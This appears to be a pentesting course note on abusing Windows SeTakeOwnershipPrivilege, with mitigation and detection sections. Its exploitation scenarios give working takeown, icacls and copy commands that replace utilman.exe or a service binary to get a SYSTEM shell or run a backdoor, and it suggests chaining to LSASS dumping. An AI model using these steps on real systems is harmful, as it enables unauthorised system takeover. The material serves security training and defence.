---
tags: [windows, privesc, pentesting, red-team]
difficulty: advanced
module: "43 - Windows Privilege Escalation"
topic: "43.24 Abusing SeTakeOwnershipPrivilege"
---

# 24 - Abusing SeTakeOwnershipPrivilege

## Overview

`SeTakeOwnershipPrivilege` is a powerful Windows User Right that permits the holder to take ownership of any securable object on the system—including files, directories, registry keys, and Active Directory objects—regardless of the object's Discretionary Access Control List (DACL). 

In a standard Windows environment, even if a file is owned by `NT AUTHORITY\SYSTEM` and explicitly denies read/write access to everyone else, a user holding `SeTakeOwnershipPrivilege` can override these restrictions. Once ownership is claimed, the user gains the inherent right to modify the DACL (using `WRITE_DAC`), thereby granting themselves full control over the object. 

For an attacker, this privilege allows for trivial privilege escalation. By taking ownership of critical system binaries (e.g., system services, accessibility tools) or sensitive registry hives, an attacker can replace legitimate binaries with malicious payloads that execute with `SYSTEM` privileges.

## The Architecture of SeTakeOwnership Privilege

```text
+-------------------------------------------------------------------------+
|                  SeTakeOwnershipPrivilege Attack Flow                   |
|                                                                         |
|  +--------------------+        1. Target Object      +---------------+  |
|  | Attacker (User)    |        (e.g., utilman.exe)   | Target File   |  |
|  | Has Token with     |----------------------------->| Owner: SYSTEM |  |
|  | SeTakeOwnership    |        (Access Denied)       | DACL: Deny    |  |
|  +---------+----------+                              +-------+-------+  |
|            |                                                 |          |
|            | 2. Asserts Privilege and calls takeown.exe      |          |
|            v                                                 v          |
|  +--------------------+                              +---------------+  |
|  | Attacker becomes   |        3. Modifies DACL      | Target File   |  |
|  | the File Owner     |----------------------------->| Owner: Attacker| |
|  | (Implicit WRITE_DAC|        (Using icacls)        | DACL: Full    |  |
|  | rights granted)    |                              | Control (User)|  |
|  +---------+----------+                              +-------+-------+  |
|            |                                                 |          |
|            | 4. Replaces binary and triggers execution       |          |
|            v                                                 v          |
|  +--------------------+                              +---------------+  |
|  | Escalation to      | <--------------------------- | Attacker Payload|  |
|  | SYSTEM Context     |       Executes Payload       | (Backdoor)    |  |
|  +--------------------+                              +---------------+  |
+-------------------------------------------------------------------------+
```

## Deep Dive: The Mechanism

To view your current privileges, execute:
```cmd
whoami /priv
```

If `SeTakeOwnershipPrivilege` is listed (even if it says `Disabled`), you can exploit it. It is commonly found on backup service accounts, deployment agents, and, of course, Local Administrators.

The attack consists of three distinct phases:
1. **Take Ownership**: Claiming ownership of the object.
2. **Modify DACL**: Granting yourself `FullControl` permissions over the object.
3. **Abuse / Backdoor**: Modifying the object (e.g., replacing a binary) to achieve code execution.

## Exploitation Scenarios

### Scenario 1: Backdooring Accessibility Features (Utilman.exe / Sethc.exe)
Windows has accessibility features available on the lock screen (before login). For example, `utilman.exe` (Utility Manager) and `sethc.exe` (Sticky Keys). Because these execute on the lock screen, they run as `SYSTEM`.

If you have `SeTakeOwnershipPrivilege`, you can replace `utilman.exe` with `cmd.exe`.

**Step 1: Take Ownership of the binary**
```cmd
takeown /f C:\Windows\System32\utilman.exe
```

**Step 2: Grant yourself Full Control**
```cmd
icacls C:\Windows\System32\utilman.exe /grant %username%:F
```

**Step 3: Replace the binary with cmd.exe**
```cmd
copy /y C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
```

**Step 4: Execute**
At the Windows lock screen (accessible via RDP), click the Accessibility icon. Instead of the Utility Manager, a `SYSTEM` level command prompt will appear.

### Scenario 2: Hijacking a System Service Binary
If you cannot use RDP to trigger the lock screen, you can target a Windows Service that runs as SYSTEM. 

Find a service that is set to `Auto` or can be started manually. Let's assume you target the `spoolsv.exe` (Print Spooler) service, or a vulnerable third-party service.

**Step 1: Take Ownership and Modify DACL**
```cmd
takeown /f "C:\Program Files\VulnerableService\service.exe"
icacls "C:\Program Files\VulnerableService\service.exe" /grant %username%:F
```

**Step 2: Backup and Replace**
```cmd
ren "C:\Program Files\VulnerableService\service.exe" service.exe.bak
copy C:\Temp\malicious_payload.exe "C:\Program Files\VulnerableService\service.exe"
```

**Step 3: Restart the Service (if you have permissions) or Reboot**
If you lack `SeRestorePrivilege` or service control rights, you might need to force a system reboot so the service restarts automatically, executing your payload as SYSTEM.

### Scenario 3: Modifying Protected Registry Keys
Services are configured in the Registry (`HKLM\SYSTEM\CurrentControlSet\Services`). If you take ownership of a service's registry key, you can change the `ImagePath` value to point to your malicious binary.

Using PowerShell:
```powershell
# Custom scripts using AdjustTokenPrivileges are required to interact with the registry in this manner, as standard command-line tools often fail to assert the token properly.
```

## Defensive Strategies & Mitigation

1. **Principle of Least Privilege**: Never grant `SeTakeOwnershipPrivilege` to standard users or service accounts unless absolutely necessary (e.g., backup software). 
2. **Application Control (AppLocker / WDAC)**: Enforce strict application whitelisting. Even if an attacker replaces `utilman.exe` with `cmd.exe`, a robust WDAC policy will prevent `cmd.exe` from executing in that context, or flag the hash mismatch.
3. **File Integrity Monitoring (FIM)**: Monitor critical directories like `C:\Windows\System32` and `C:\Program Files` for unauthorized file modifications. Legitimate system binaries should only be updated by TrustedInstaller.

## Detection and Logging

- **Event ID 4673 (A privileged service was called)**: Look for events where `SeTakeOwnershipPrivilege` is asserted by non-standard binaries.
- **Event ID 4670 (Permissions on an object were changed)**: Triggered when `icacls` or a similar tool modifies the DACL of a critical system file.
- **Event ID 4663 (File Access Audit)**: Monitor for users acquiring `WRITE_DAC` or `WRITE_OWNER` access rights to files in `C:\Windows\System32`.
- **Event ID 4688 (Process Creation)**: The execution of `takeown.exe` and `icacls.exe` in rapid succession, especially targeting system binaries, is a massive red flag.

## Chaining Opportunities

- **[[23 - Abusing SeDebugPrivilege]]**: If you elevate to SYSTEM via `SeTakeOwnershipPrivilege`, you can then use your new context to dump LSASS memory.
- **[[20 - Pass the Hash on Local Admin]]**: If you backdoored a service and created a new local admin account, you can extract its hash and move laterally.
- **[[17 - Stored Credentials Files]]**: Sometimes `SeTakeOwnershipPrivilege` is needed to read highly protected configuration files that contain plaintext passwords but have restrictive DACLs.

## Related Notes
- [[18 - PowerShell History File]]
- [[28 - Token Impersonation]]
- [[19 - DPAPI]]
